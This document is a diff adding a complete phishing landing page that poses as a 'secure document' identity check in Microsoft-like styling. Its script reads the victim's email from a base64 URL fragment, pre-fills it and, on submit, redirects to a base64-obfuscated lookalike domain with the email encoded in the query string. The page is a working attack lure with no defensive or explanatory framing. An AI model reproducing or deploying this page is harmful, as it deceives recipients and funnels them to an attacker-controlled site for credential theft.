@@ -1,1 +1,119 @@
 
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verify Your Identity</title>
+  <style>
+    body { 
+      font-family: "Segoe UI", sans-serif; 
+      background-color: #f4f4f4; 
+      display: flex; 
+      justify-content: center; 
+      align-items: center; 
+      height: 100vh; 
+      margin: 0;
+      color: #333; 
+    } 
+    .container { 
+      background-color: white; 
+      border: 1px solid #ccc; 
+      border-radius: 5px; 
+      padding: 20px; 
+      width: 90%; 
+      max-width: 350px; 
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); 
+      text-align: center; 
+    } 
+    .container img { 
+      width: 80px; 
+      margin-bottom: 15px; 
+    } 
+    .container h2 { 
+      font-size: 20px; 
+      color: #333; 
+      margin-bottom: 15px; 
+    } 
+    .container p { 
+      color: #666; 
+      margin-bottom: 10px; 
+      font-size: 14px;
+    } 
+    .container input[type="email"] { 
+      width: 100%; 
+      padding: 10px; 
+      border: 1px solid #ccc; 
+      border-radius: 5px; 
+      font-size: 14px; 
+      box-sizing: border-box; 
+      margin-bottom: 20px; 
+      text-align: center;
+    } 
+    .container button { 
+      width: 100%; 
+      padding: 10px; 
+      background-color: #0078d4; 
+      color: white; 
+      border: none; 
+      border-radius: 5px; 
+      font-size: 16px; 
+      cursor: pointer; 
+    } 
+    .container button:hover { 
+      background-color: #005a9e; 
+    } 
+    .container .footer { 
+      font-size: 12px; 
+      color: #888; 
+      margin-top: 20px; 
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img src="https://i.pcmag.com/imagery/reviews/07LERcQBRVgcVKystB3aGUU-11.fit_scale.size_1028x578.v1569471957.jpg" alt="Secure Document">
+    <h2>Verify Your Identity</h2>
+    <p><strong>You've received a secure document.</strong></p>
+    <p>Please verify your email address to access it.</p>
+    <form id="verification-form">
+      <label for="email-input" class="visually-hidden">Email Address</label>
+      <input id="email-input" type="email" placeholder="Enter email" required>
+      <button type="submit">Next</button>
+    </form>
+  </div>
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      const emailInput = document.getElementById('email-input');
+      const hash = window.location.hash.substring(1); // Get hash from URL
+      const email = decodeURIComponent(atob(hash)); // Decode email from base64
+
+      if (validateEmail(email)) {
+        emailInput.value = email;
+      }
+    });
+
+    function continueLoading() {
+      const email = document.getElementById('email-input').value.trim().toLowerCase();
+      if (validateEmail(email)) {
+        const encodedLink = "aHR0cHM6Ly9kMGNvU2gzci5hdmpldC10dy5jb20vRmFPME0="; // Encoded URL
+        const link = atob(encodedLink) + "?e=" + btoa(email);
+        window.location.href = link;
+      } else {
+        alert("Please enter a valid email.");
+      }
+    }
+
+    function validateEmail(email) {
+      const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+      return re.test(email);
+    }
+
+    document.getElementById('verification-form').addEventListener('submit', function(event) {
+      event.preventDefault();
+      continueLoading();
+    });
+  </script>
+</body>
+</html>
+
